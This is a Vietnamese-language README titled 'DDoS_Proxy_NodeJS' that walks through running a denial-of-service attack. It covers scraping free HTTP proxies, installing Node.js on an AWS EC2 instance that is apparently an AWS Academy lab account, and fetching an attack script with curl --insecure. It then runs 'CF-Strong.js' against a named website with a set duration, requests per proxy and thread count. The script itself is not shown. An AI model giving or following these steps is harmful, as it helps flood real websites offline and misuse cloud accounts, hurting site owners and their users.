# DDoS_Proxy_NodeJS
https://awsacademy.instructure.com/courses/74031/modules/items/6643523

website lấy proxy http(tạo một tệp txt rồi copy hết tất cả trong trang web này)
https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all

https://upload-vpn.vinahost.vn/ (website upload file len terminal remote tren website)
Kéo thả file proxy và script chạy(đã gửi) lên trang web

Linux
-----------------------------------------------------------------
Qua terminal bên ec2
Copy lệnh dưới và dán vào:
Sudo apt update -y
Curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
Sudo apt-get install nodejs -y

Tiếp theo qua website upload copy link file mà bạn đã upload
Lệnh upload trên terminal: curl -O link --insecure
Vd: curl -O https://example.com/file.js --insecure

-----------------------------------------------------------------

Sau khi upload đủ cả 2 file dùng: ls để kiểm tra xem đã có 2 file vừa upload chưa
Dùng tiếp lệnh npm i colors
-> Để cài đặt module cho script đuôi .js

Lệnh chạy script
node file.js link thời_gian requests/proxy threads(luồng) proxy_file
vd: node CF-Strong.js http://www.thayphet.net/ 300 64 12 Proxy.txt

Cách kiểm tra số luồng hiện có trên terminal: lscpu
Kiếm dòng: Thread(s) per core:
